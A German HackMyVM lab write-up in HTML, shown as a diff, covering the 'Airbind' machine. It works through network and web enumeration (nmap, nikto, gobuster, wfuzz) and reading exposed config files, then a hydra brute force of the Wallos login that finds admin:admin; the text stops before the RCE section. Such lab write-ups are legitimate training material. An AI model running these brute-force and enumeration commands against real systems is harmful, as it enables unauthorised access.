@@ -1,0 +1,1046 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airbind - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">  
+</head>
+ <body>
+ <div class="nav-wrapper"> 
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <h1>Airbind - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <!-- HINWEIS: Klasse 'level-medium' wird verwendet, um GELB gemäß Anforderung zu erzwingen -->
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle level-medium-circle"> <!-- Zusätzliche Klasse für CSS-Targeting der Kreis-Farbe -->
+                <div class="segment segment-1"></div>  
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrund wird durch CSS gesteuert -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">Burp Suite (implizit)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">netstat</div>
+                <div class="tool-item">ping6</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ip</div>
+                <div class="tool-item">ifconfig</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration</a></li>
+                 <li><a href="#initial-access">Initial Access & POC (RCE)</a></li>
+                 <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                 <li><a href="#lateral-movement">Lateral Movement (IPv6)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist wieder die Identifizierung aktiver Hosts im lokalen Netzwerk mittels `arp-scan -l`. Dieses Tool sendet ARP-Anfragen, um IP- und MAC-Adressen von Geräten im selben Netzwerksegment zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `arp-scan` findet erfolgreich ein Zielsystem mit der IP-Adresse `192.168.2.106`. Die zugehörige MAC-Adresse `08:00:27:dc:2a:3b` gehört laut OUI-Lookup (PCS Systemtechnik GmbH) zu Oracle VirtualBox, was darauf hindeutet, dass es sich um eine virtuelle Maschine handelt. Dies ist die primäre IP für weitere Untersuchungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP `192.168.2.106` als Ziel für detailliertere Scans (Nmap, Nikto etc.) verwenden. Die MAC-Adresse notieren, bestätigt die Virtualisierungsumgebung.<br><strong>Empfehlung (Admin):</strong> Netzwerkmonitoring implementieren, um ARP-Scans zu erkennen. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.106</span>	<span class="command">08:00:27:dc:2a:3b</span>	<span class="command">PCS Systemtechnik GmbH</span>
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Die lokale Hosts-Datei (`/etc/hosts`) wird mit dem Texteditor `vi` bearbeitet, um der gefundenen IP-Adresse `192.168.2.106` den Hostnamen `airbinds.hmv` zuzuordnen. Dies vereinfacht die Ansprache des Ziels in nachfolgenden Schritten, insbesondere bei Webanwendungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine Standardprozedur, um die lokale Namensauflösung für das Ziel sicherzustellen. Die auskommentierten Einträge für `animetronic.hmv` und `king.vln` deuten auf frühere Arbeiten an anderen Zielen hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer die Hosts-Datei pflegen, wenn mit festen IPs gearbeitet wird, um potenzielle Probleme mit virtuellen Hosts oder Zertifikaten zu vermeiden.<br><strong>Empfehlung (Admin):</strong> Keine serverseitigen Maßnahmen gegen lokale Hosts-Datei-Manipulation möglich. Sicherstellen, dass Serverkonfigurationen, die auf Hostnamen basieren, korrekt und dokumentiert sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	CCat
+
+
+        #       192.168.2.104   animetronic.hmv  
+        #       192.168.2.105   king.vln
+                <span class="command">192.168.2.106   airbinds.hmv</span>
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> `nikto` wird eingesetzt, ein Webserver-Scanner, der nach bekannten Schwachstellen, Fehlkonfigurationen, Standarddateien und interessanten Verzeichnissen sucht. `-h http://192.168.2.106` gibt das Ziel an.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto liefert wertvolle erste Hinweise auf die Webanwendung und den Server:
+                *   Server: `Apache/2.4.57 (Ubuntu)`.
+                *   Fehlende Security Header: `X-Frame-Options` (Clickjacking-Schutz), `X-Content-Type-Options` (MIME-Sniffing-Schutz).
+                *   Cookie `PHPSESSID` ohne `HttpOnly`-Flag (anfällig für Diebstahl via XSS).
+                *   Root `/` leitet zu `login.php` weiter.
+                *   Verzeichnisauflistung (Directory Indexing) aktiv für `/scripts/`, `/db/`, `/includes/`, `/images/`, `/styles/`. Dies ist oft eine Informationsquelle.
+                *   Interne IP-Offenlegung (`127.0.1.1`) möglich (CVE-2000-0649).
+                *   `login.php` als Admin-Login identifiziert.
+                *   `.gitignore` und `.dockerignore` gefunden, die Aufschluss über die Projektstruktur geben können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Verzeichnisse mit Directory Indexing durchsuchen, insbesondere `/db/` und `/includes/`. Die Dateien `.gitignore` und `.dockerignore` herunterladen und analysieren. Die fehlenden Security Header und das unsichere Cookie notieren. Die Login-Seite `login.php` genauer untersuchen.<br><strong>Empfehlung (Admin):</strong> Fehlende Security Header implementieren (`X-Frame-Options: SAMEORIGIN` oder `DENY`, `X-Content-Type-Options: nosniff`). Cookies mit `HttpOnly`- und `Secure`-Flags versehen. Verzeichnisauflistung deaktivieren (`Options -Indexes` in Apache-Konfiguration). Interne IP-Offenlegung verhindern (Serverkonfiguration prüfen). `.gitignore` und `.dockerignore` sollten keine sensiblen Pfade enthalten und idealerweise nicht über das Web erreichbar sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nikto -h http://192.168.2.106</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.106
++ Target Hostname:    192.168.2.106
++ Target Port:        80
++ Start Time:         2024-08-07 22:34:06 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.57 (Ubuntu)</span>
++ /: The anti-clickjacking <span class="command">X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The <span class="command">X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: Cookie <span class="command">PHPSESSID created without the httponly flag.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ Root page / redirects to: <span class="command">login.php</span>
++ <span class="command">/scripts/: Directory indexing found.</span>
++ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
++ <span class="command">/db/: Directory indexing found.</span>
++ /db/: This might be interesting.
++ <span class="command">/includes/: Directory indexing found.</span>
++ /includes/: This might be interesting.
++ <span class="command">/images/: Directory indexing found.</span>
++ <span class="command">/styles/: Directory indexing found.</span>
++ <span class="command">/login.php: Admin login page/section found.</span>
++ <span class="command">/.gitignore: .gitignore file found.</span> It is possible to grasp the directory structure.
++ <span class="command">/.dockerignore: .dockerignore file found.</span> It may be possible to grasp the directory structure and learn more about the site.
++ 8909 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2024-08-07 22:34:30 (GMT2) (24 seconds)
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender `nmap`-Scan wird durchgeführt, um offene Ports, Dienste, Versionen und Betriebssysteminformationen zu sammeln.
+                *   `-sC`: Führt Standard-Nmap-Skripte aus.
+                *   `-sS`: SYN-Scan (Stealth).
+                *   `-sV`: Versionserkennung.
+                *   `-A`: Aggressiver Scan (OS-Erkennung, Version, Skripte, Traceroute).
+                *   `-O`: OS-Erkennung (Teil von `-A`).
+                *   `-T5`: Sehr schnelles Timing (riskant).
+                *   `-p-`: Scannt alle TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert wichtige Ergebnisse:
+                *   **Port 22 (SSH):** Ist als `filtered` markiert. Das bedeutet, Nmap konnte nicht eindeutig bestimmen, ob der Port offen oder geschlossen ist, da er keine Antwort erhielt oder die Pakete blockiert wurden (z.B. durch eine Firewall).
+                *   **Port 80 (HTTP):** Ist offen und läuft ein Apache 2.4.57 auf Ubuntu. Das `-sC`-Skript bestätigt das von Nikto gefundene unsichere PHPSESSID-Cookie (kein HttpOnly). Der Titel der Seite ist "Wallos - Subscription Tracker", und die Startseite ist `login.php`.
+                *   **OS-Erkennung:** Ist nicht eindeutig (`No exact OS matches`), schlägt aber verschiedene Linux-Versionen vor.
+                *   **MAC-Adresse:** Bestätigt VirtualBox.
+            Der gefilterte SSH-Port ist eine wichtige Information.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Fokus auf den offenen Port 80 (HTTP) legen. Die Webanwendung "Wallos - Subscription Tracker" genauer untersuchen. Den gefilterten SSH-Port im Hinterkopf behalten – vielleicht ist er nur von bestimmten IPs erreichbar oder wird durch eine Firewall blockiert, die später umgangen werden kann.<br><strong>Empfehlung (Admin):</strong> Firewall-Regeln überprüfen. Wenn SSH nicht benötigt wird, sollte der Port geschlossen sein. Wenn er benötigt wird, sicherstellen, dass die Firewall-Regeln korrekt sind und ihn nicht fälschlicherweise als `filtered` erscheinen lassen. Die Empfehlungen von Nikto bezüglich HTTP-Headern und Cookies umsetzen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sC -sS -sV -AO -T5 192.168.2.106 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 22:33 CEST
+Nmap scan report for airbind (192.168.2.106)
+Host is up (0.00018s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+<span class="command">22/tcp filtered ssh</span>
+<span class="command">80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))</span>
+|_http-server-header: Apache/2.4.57 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      <span class="password">httponly flag not set</span>
+| http-title: <span class="command">Wallos - Subscription Tracker</span>
+|_Requested resource was login.php
+MAC Address: 08:00:27:DC:2A:3B (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.5 (94%), Linksys EA3500 WAP (94%), Linux 3.16 (93%), Linux 2.6.18 - 2.6.32 (93%), Linux 5.0 - 5.4 (92%), Linux 4.4 (92%), Linux 5.4 (92%), Android 4.4.0 (92%), Linux 2.6.32 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.18 ms airbind (192.168.2.106)
+
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nmap -sC -sS -sV -AO -T5 192.168.2.106 -p- | grep open</span></div>
+                    <pre>
+<span class="command">80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden (Directory/File Brute-Forcing).
+                *   `dir`: Modus für Verzeichnissuche.
+                *   `-u "http://airbinds.hmv"`: Die Ziel-URL.
+                *   `-w "/usr/.../directory-list-2.3-medium.txt"`: Die Wortliste für Verzeichnisse/Dateien.
+                *   `-x ...`: Eine lange Liste von Dateiendungen, die zusätzlich zum Wort aus der Liste angehängt und getestet werden sollen.
+                *   `-b '503,404'`: Statuscodes, die ignoriert werden sollen (hier nicht relevant, da 404 Standard ist und 503 nicht auftritt).
+                *   `-e`: Erweiterter Modus, gibt die vollständige URL aus.
+                *   `--no-error`: Unterdrückt Fehlermeldungen (z.B. bei Verbindungsproblemen).
+                *   `-k`: Ignoriert TLS/SSL-Zertifikatsfehler (hier nicht relevant für HTTP).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet mehrere interessante Pfade und Dateien:
+                *   Bestätigt die von Nikto gefundenen Verzeichnisse (`images`, `scripts`, `includes`, `db`, `styles`) und die `login.php`.
+                *   Findet weitere PHP-Dateien: `index.php` (leitet zu login.php weiter), `about.php`, `logos.php`, `stats.php`, `registration.php`, `logout.php`, `settings.php`, `auth.php`. Die meisten leiten unauthentifiziert zu `login.php` weiter. `logos.php` und `auth.php` geben Status 200 zurück.
+                *   Findet potenziell sensitive Dateien: `startup.sh`, `nginx.conf`, `manifest.json`. Diese könnten Konfigurationsdetails enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Dateien `startup.sh`, `nginx.conf` und `manifest.json` herunterladen und analysieren. Die PHP-Seiten, die Status 200 zurückgeben (`logos.php`, `auth.php`, `login.php`), genauer auf Funktionalität und mögliche Schwachstellen untersuchen. Die Verzeichnisse mit Auflistung weiter durchsehen.<br><strong>Empfehlung (Admin):</strong> Zugriff auf Konfigurationsdateien (`.conf`, `.sh`, `.json`) über den Webserver verhindern. Sicherstellen, dass nur notwendige Dateien und Verzeichnisse öffentlich zugänglich sind. Authentifizierung für alle sensiblen Seiten erzwingen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">gobuster dir -u "http://airbinds.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map -b '503,404' -e --no-error -k</span></div>
+                    <pre>
+==============================================================================================================================
+<span class="command">http://airbinds.hmv/index.php</span>            (Status: 302) [Size: 0] [--> login.php]
+http://airbinds.hmv/.php                 (Status: 403) [Size: 277]
+http://airbinds.hmv/.html                (Status: 403) [Size: 277]
+http://airbinds.hmv/.phtml               (Status: 403) [Size: 277]
+<span class="command">http://airbinds.hmv/images</span>               (Status: 301) [Size: 313] [--> http://airbinds.hmv/images/]
+<span class="command">http://airbinds.hmv/about.php</span>            (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://airbinds.hmv/login.php</span>            (Status: 200) [Size: 1924]
+<span class="command">http://airbinds.hmv/logos.php</span>            (Status: 200) [Size: 1977]
+<span class="command">http://airbinds.hmv/stats.php</span>            (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://airbinds.hmv/screenshots</span>          (Status: 301) [Size: 318] [--> http://airbinds.hmv/screenshots/]
+<span class="command">http://airbinds.hmv/scripts</span>              (Status: 301) [Size: 314] [--> http://airbinds.hmv/scripts/]
+<span class="command">http://airbinds.hmv/registration.php</span>     (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://airbinds.hmv/includes</span>             (Status: 301) [Size: 315] [--> http://airbinds.hmv/includes/]
+<span class="command">http://airbinds.hmv/db</span>                   (Status: 301) [Size: 309] [--> http://airbinds.hmv/db/]
+<span class="command">http://airbinds.hmv/logout.php</span>           (Status: 302) [Size: 0] [--> .]
+<span class="command">http://airbinds.hmv/styles</span>               (Status: 301) [Size: 313] [--> http://airbinds.hmv/styles/]
+<span class="command">http://airbinds.hmv/settings.php</span>         (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://airbinds.hmv/auth.php</span>             (Status: 200) [Size: 0]
+<span class="command">http://airbinds.hmv/startup.sh</span>           (Status: 200) [Size: 1025]
+<span class="command">http://airbinds.hmv/libs</span>                 (Status: 301) [Size: 311] [--> http://airbinds.hmv/libs/]
+<span class="command">http://airbinds.hmv/nginx.conf</span>           (Status: 200) [Size: 1186]
+<span class="command">http://airbinds.hmv/manifest.json</span>        (Status: 200) [Size: 2569]
+==============================================================================================================================
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der von Gobuster gefundenen Datei `nginx.conf` wird mit `curl` heruntergeladen und angezeigt. `curl` ist ein Kommandozeilentool zum Übertragen von Daten mit URLs.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Nginx-Konfigurationsdatei ist sehr aufschlussreich:
+                *   Sie bestätigt, dass Nginx als Reverse-Proxy oder Webserver läuft (obwohl Nmap Apache meldete – vielleicht läuft Apache hinter Nginx, oder Nginx wird hier nur zur Konfiguration von PHP-FPM verwendet, während Apache der Hauptserver ist? Oder die `Server:`-Header ist irreführend).
+                *   Das Web-Root-Verzeichnis ist `/var/www/html`.
+                *   PHP-Dateien werden an einen FastCGI-Prozess auf `127.0.0.1:9000` (vermutlich PHP-FPM) weitergeleitet.
+                *   **Wichtig:** Es gibt eine `location`-Direktive, die den Zugriff auf Dateien mit der Endung `.db` explizit verbietet (`deny all; return 403;`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Information über den blockierten Zugriff auf `.db`-Dateien ist wichtig. Dies erklärt, warum der direkte Zugriff auf eine potenzielle Datenbankdatei im `/db/`-Verzeichnis fehlschlagen würde. Die PHP-FPM-Konfiguration (`127.0.0.1:9000`) notieren – falls später eine SSRF-Schwachstelle gefunden wird, könnte dies ein internes Ziel sein.<br><strong>Empfehlung (Admin):</strong> Gut, dass der direkte Zugriff auf `.db`-Dateien blockiert ist. Sicherstellen, dass auch andere sensitive Dateitypen (Logdateien, Backups, Konfigurationsdateien) angemessen geschützt sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl http://airbinds.hmv/nginx.conf</span></div>
+                    <pre>
+user  nginx;
+worker_processes  1;
+
+error_log  /var/log/nginx/error.log warn;
+pid        /var/run/nginx.pid;
+
+events {
+    worker_connections  1024;
+}
+
+http {
+    include       /etc/nginx/mime.types;
+    default_type  application/octet-stream;
+
+    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
+                      '$status $body_bytes_sent "$http_referer" '
+                      '"$http_user_agent" "$http_x_forwarded_for"';
+
+    access_log  /var/log/nginx/access.log  main;
+
+    sendfile        on;
+    keepalive_timeout  65;
+
+    server {
+        listen       80;
+        server_name  localhost;
+
+        location / {
+            <span class="command">root   /var/www/html;</span>
+            index  index.php;
+        }
+
+        location ~ \.php$ {
+            root           /var/www/html;
+            <span class="command">fastcgi_pass   127.0.0.1:9000;</span>
+            fastcgi_index  index.php;
+            fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
+            include        fastcgi_params;
+        }
+
+        location ~ \.db$ {
+            <span class="command">deny all;</span>
+            <span class="command">return 403;</span>
+        }
+    }
+
+    include /etc/nginx/conf.d/*.conf;
+}
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach virtuellen Hosts (Subdomains) zu suchen.
+                *   `-c`: Farbige Ausgabe.
+                *   `-w ...subdomains...txt`: Wortliste mit Subdomain-Namen.
+                *   `-u "http://airbinds.hmv"`: Basis-URL.
+                *   `-H "Host: FUZZ.airbinds.hmv"`: Setzt den HTTP-Host-Header. `FUZZ` wird durch die Wörter aus der Liste ersetzt.
+                *   `--hc "404"`: Versteckt Antworten mit Statuscode 404.
+                *   `--hh 0`: Versteckt Antworten mit 0 Zeichen (oft bei Weiterleitungen oder Fehlern).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan läuft durch die gesamte Wortliste (`114441` Anfragen), findet aber keine gültigen Subdomains, die eine andere Antwort als die Standardseite (oder eine versteckte Antwort) liefern (`Filtered Requests: 114437` - die Differenz sind wahrscheinlich Timeouts oder andere Fehler, keine gültigen Subdomains).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Suche nach Subdomains war hier nicht erfolgreich. Andere Methoden wie DNS-Zone-Transfers (falls ein DNS-Server gefunden wird), passive DNS-Recherche (Online-Tools) oder die Analyse von TLS-Zertifikaten (falls HTTPS verfügbar wäre) könnten versucht werden. Vorerst auf die Hauptanwendung konzentrieren.<br><strong>Empfehlung (Admin):</strong> Unnötige Subdomains oder Wildcard-DNS-Einträge vermeiden. DNS-Server sicher konfigurieren (Zone-Transfers nur an autorisierte Server erlauben).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://airbinds.hmv" -H "Host: FUZZ.airbinds.hmv" --hc "404" --hh 0</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://airbinds.hmv/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                      
+=====================================================================
+                    
+
+Total time: 0
+Processed Requests: 114441
+Filtered Requests: 114437
+Requests/sec.: 0
+</pre>
+                </div>
+            </div>
+
+            <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Pentester besucht das Verzeichnis `/db/`, das zuvor als offen für Directory Indexing identifiziert wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wie von Nikto und Gobuster gemeldet, ist die Verzeichnisauflistung aktiv. Sie enthüllt eine Datei namens `wallos.db`. Aufgrund der Endung `.db` und des Namens der Anwendung ("Wallos") handelt es sich höchstwahrscheinlich um die SQLite-Datenbank der Anwendung. Obwohl die Nginx-Konfiguration den direkten Download von `.db`-Dateien blockiert, ist die Datei hier über die Verzeichnisauflistung sichtbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Auch wenn der direkte Download blockiert ist, ist die Existenz der Datei bestätigt. Versuchen, die Datenbank über andere Wege zu erhalten (z.B. Schwachstellen in der Anwendung, die LFI oder SQL-Injection ermöglichen könnten, oder falls später Dateisystemzugriff erlangt wird). Der Dateiname `wallos.db` sollte notiert werden.<br><strong>Empfehlung (Admin):</strong> Verzeichnisauflistung für alle Verzeichnisse deaktivieren (`Options -Indexes`). Auch wenn der direkte Download blockiert ist, sollte die Existenz sensibler Dateien nicht preisgegeben werden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies Browser-Ausgabe/Verzeichnisinhalt ist -->
+                     <pre>
+http://airbinds.hmv/db/
+
+Index of /db
+=====================================================================
+[ICO]	Name	Last modified	       Size	Description
+=====================================================================
+[ ] <span class="command">wallos.db</span>	2024-05-21 15:07 	64K	 
+=====================================================================
+Apache/2.4.57 (Ubuntu) Server at airbinds.hmv Port 80
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt des von Gobuster gefundenen Skripts `startup.sh` wird mit `curl` heruntergeladen und angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieses Skript ist extrem informativ:
+                *   Es startet `php-fpm` und `nginx`.
+                *   Es startet `crond` (Cron Daemon).
+                *   Es führt PHP-Skripte aus `/var/www/html/endpoints/cronjobs/` und `/var/www/html/endpoints/db/` aus, um die Datenbank zu erstellen (`createdatabase.php`), Migrationen durchzuführen (`migrate.php`) und Zahlungen/Wechselkurse zu aktualisieren (`updatenextpayment.php`, `updateexchange.php`). Diese Pfade und Skriptnamen sind wertvolle Informationen.
+                *   Es setzt Berechtigungen für `/var/www/html/db/` und `/var/www/html/images/uploads/logos` auf `755` und den Besitzer auf `www-data:www-data`.
+                *   Es endet mit `tail -f /dev/null`, um den Container (vermutlich Docker) am Laufen zu halten.
+            Das Skript gibt Einblick in die Initialisierung und die internen Abläufe der Anwendung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Pfade zu den Cronjob- und DB-Skripten notieren. Diese könnten Endpunkte sein, die direkt aufgerufen werden können oder Schwachstellen enthalten. Die Berechtigungsänderungen (insbesondere `755` für `/db/`) und der Besitz durch `www-data` sind relevant, falls Dateisystemzugriff erlangt wird. Das Skript bestätigt die Verwendung von PHP-FPM.<br><strong>Empfehlung (Admin):</strong> Startup-Skripte sollten nicht öffentlich zugänglich sein. Sicherstellen, dass die Berechtigungen, die im Skript gesetzt werden, dem Prinzip der geringsten Rechte folgen. Cronjobs sicher implementieren und deren Endpunkte schützen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl -s http://airbinds.hmv/startup.sh</span></div>
+                     <!-- Ausgabe des Skripts -->
+                     <pre>
+#!/bin/sh
+
+echo "Startup script is running..." > /var/log/startup.log
+
+# Start both PHP-FPM and Nginx
+<span class="command">php-fpm</span> & <span class="command">nginx -g 'daemon off;'</span> & touch ~/startup.txt
+
+# Start the cron daemon
+<span class="command">crond</span>
+
+# Wait one second before running scripts
+sleep 1
+
+# Create database if it does not exist
+<span class="command">/usr/local/bin/php /var/www/html/endpoints/cronjobs/createdatabase.php</span>
+
+# Perform any database migrations
+<span class="command">/usr/local/bin/php /var/www/html/endpoints/db/migrate.php</span>
+
+# Change permissions on the database directory
+<span class="command">chmod -R 755 /var/www/html/db/</span>
+<span class="command">chown -R www-data:www-data /var/www/html/db/</span>
+
+# Change permissions on the logos directory
+<span class="command">chmod -R 755 /var/www/html/images/uploads/logos</span>
+<span class="command">chown -R www-data:www-data /var/www/html/images/uploads/logos</span>
+
+# Run updatenextpayment.php and wait for it to finish
+<span class="command">/usr/local/bin/php /var/www/html/endpoints/cronjobs/updatenextpayment.php</span>
+
+# Run updateexchange.php
+<span class="command">/usr/local/bin/php /var/www/html/endpoints/cronjobs/updateexchange.php</span>
+
+# Keep the container running indefinitely (this won't exit)
+tail -f /dev/null
+</pre>
+                 </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access & POC (RCE)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> `hydra`, ein Passwort-Cracking-Tool, wird verwendet, um einen Brute-Force-Angriff auf das Web-Login-Formular durchzuführen.
+                *   `-l admin`: Testet den Benutzernamen `admin`.
+                *   `-P /usr/share/wordlists/rockyou.txt`: Verwendet die `rockyou.txt`-Wortliste für Passwörter.
+                *   `airbinds.hmv`: Das Zielsystem.
+                *   `http-post-form`: Das zu verwendende Hydra-Modul.
+                *   `"/login.php:username=^USER^&password=^PASS^:Login details are incorrect."`: Die Konfiguration für das Modul:
+                    *   `/login.php`: Der Pfad zum Login-Formular.
+                    *   `username=^USER^&password=^PASS^`: Die POST-Parameter, wobei `^USER^` und `^PASS^` Platzhalter sind.
+                    *   `Login details are incorrect.`: Die Fehlermeldung, die bei einem falschen Login auf der Ergebnisseite erscheint.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hydra ist sehr schnell erfolgreich! Es findet heraus, dass die Anmeldedaten `<span class="password">admin:admin</span>` gültig sind. Dies ist ein sehr schwaches Passwort und ein kritischer Fund.</p>
